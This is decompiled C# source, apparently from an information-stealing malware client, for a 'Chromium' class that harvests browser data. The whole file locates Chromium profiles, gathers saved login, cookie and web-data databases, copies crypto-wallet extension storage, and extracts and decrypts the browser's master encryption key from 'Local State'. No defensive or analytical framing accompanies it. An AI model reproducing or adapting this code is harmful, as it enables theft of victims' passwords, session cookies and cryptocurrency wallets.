using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using client.Helpers;
using client.Models;
using client.Network;

namespace client.Body
{
	// Token: 0x0200003D RID: 61
	internal class Chromium
	{
		// Token: 0x0600017C RID: 380 RVA: 0x00008330 File Offset: 0x00006530
		public static List<ChromiumBrowserStructure> Get()
		{
			List<ChromiumBrowserStructure> list = new List<ChromiumBrowserStructure>();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			list.AddRange(Chromium.Parse(folderPath));
			list.AddRange(Chromium.Parse(folderPath2));
			return list;
		}

		// Token: 0x0600017D RID: 381 RVA: 0x0000836C File Offset: 0x0000656C
		private static List<ChromiumBrowserStructure> Parse(string dir)
		{
			List<ChromiumBrowserStructure> list = new List<ChromiumBrowserStructure>();
			foreach (string text in ParserHelper.ParseFolders(dir, 4, "Local State"))
			{
				List<ChromiumDefaultProfile> profs = new List<ChromiumDefaultProfile>();
				string empty = string.Empty;
				if (Chromium.ValidatePath(text, out empty))
				{
					Chromium.GenerateFromPath(empty, ref profs);
					(from d in new DirectoryInfo(text).GetDirectories()
					where d.Name.Contains("Profile")
					select d).ToList<DirectoryInfo>().ForEach(delegate(DirectoryInfo d)
					{
						Chromium.GenerateFromPath(d.FullName, ref profs);
					});
					string name = Chromium.GetName(text, dir);
					byte[] key = Chromium.GetKey(Path.Combine(text, "Local State"));
					list.Add(new ChromiumBrowserStructure
					{
						ChromiumProfiles = profs,
						PrivateKey = key,
						ChromiumBrowserName = name
					});
				}
			}
			return list;
		}

		// Token: 0x0600017E RID: 382 RVA: 0x00008484 File Offset: 0x00006684
		private static List<DefaultFileStructure> ParseExtensions(string profile)
		{
			List<DefaultFileStructure> list = new List<DefaultFileStructure>();
			foreach (KeyValuePair<string, string> keyValuePair in Connection.exts)
			{
				if (Directory.Exists(string.Join("\\", new string[]
				{
					profile,
					"Local Extension Settings"
				}) + keyValuePair.Value))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(string.Join("\\", new string[]
					{
						profile,
						"Local Extension Settings"
					}) + keyValuePair.Value).GetFiles())
					{
						list.Add(new DefaultFileStructure
						{
							FileContent = FileHelper.ReadFile(fileInfo.FullName),
							FileName = string.Join("\\", new string[]
							{
								keyValuePair.Key,
								fileInfo.Name
							}),
							Service = DataType.Wallets
						});
					}
				}
			}
			return list;
		}

		// Token: 0x0600017F RID: 383 RVA: 0x000085B0 File Offset: 0x000067B0
		private static bool ValidatePath(string path, out string profile)
		{
			bool result = false;
			Path.Combine(path, "Default");
			if (!Directory.Exists(Path.Combine(path, "Default")))
			{
				if (ParserHelper.ParseFolders(path, 2, "Cookies").Count<string>() > 0)
				{
					result = true;
					profile = path;
				}
				else
				{
					profile = null;
				}
			}
			else if (!path.StartsWith(Path.GetTempPath()))
			{
				result = true;
				profile = Path.Combine(new string[]
				{
					Path.Combine(path, "Default")
				});
			}
			else
			{
				profile = null;
			}
			return result;
		}

		// Token: 0x06000180 RID: 384 RVA: 0x00008630 File Offset: 0x00006830
		private static void GenerateFromPath(string path, ref List<ChromiumDefaultProfile> profile)
		{
			List<DefaultFileStructure> list = new List<DefaultFileStructure>();
			list.AddRange(Chromium.ParseExtensions(path));
			string name = new DirectoryInfo(path).Name;
			profile.Add(new ChromiumDefaultProfile
			{
				ChromiumProfileName = name,
				ChromiumLoginData = Chromium.ValidateFile(path, "Login Data"),
				ChromiumCookies = (Chromium.ValidateFile(path, "Cookies") ?? Chromium.ValidateFile(path, "Network\\Cookies")),
				ChromiumWebData = Chromium.ValidateFile(path, "Web Data"),
				ChromiumExtensions = list
			});
		}

		// Token: 0x06000181 RID: 385 RVA: 0x000086B7 File Offset: 0x000068B7
		private static string ValidateFile(string path, string file)
		{
			if (File.Exists(Path.Combine(path, file)))
			{
				return Path.Combine(path, file);
			}
			return null;
		}

		// Token: 0x06000182 RID: 386 RVA: 0x000086D0 File Offset: 0x000068D0
		private static byte[] GetKey(string filepath)
		{
			byte[] result;
			try
			{
				string input = File.ReadAllText(filepath);
				byte[] array = new byte[0];
				foreach (object obj in new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(input))
				{
					Match match = (Match)obj;
					if (match.Success)
					{
						array = Convert.FromBase64String(match.Groups[1].Value);
					}
				}
				byte[] array2 = new byte[array.Length - 5];
				Array.Copy(array, 5, array2, 0, array.Length - 5);
				result = FileHelper.Decrypt(array2, null);
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000183 RID: 387 RVA: 0x00008798 File Offset: 0x00006998
		private static string GetName(string dir, string source)
		{
			string result;
			try
			{
				string[] array = dir.Replace(source + "\\", null).Split(new char[]
				{
					'\\'
				});
				if (array[array.Count<string>() - 1] == "User Data")
				{
					result = array[array.Count<string>() - 2];
				}
				else
				{
					result = array[array.Count<string>() - 1];
				}
			}
			catch
			{
				result = dir.Replace(source, null).Split(new char[]
				{
					'\\'
				})[0];
			}
			return result;
		}
	}
}
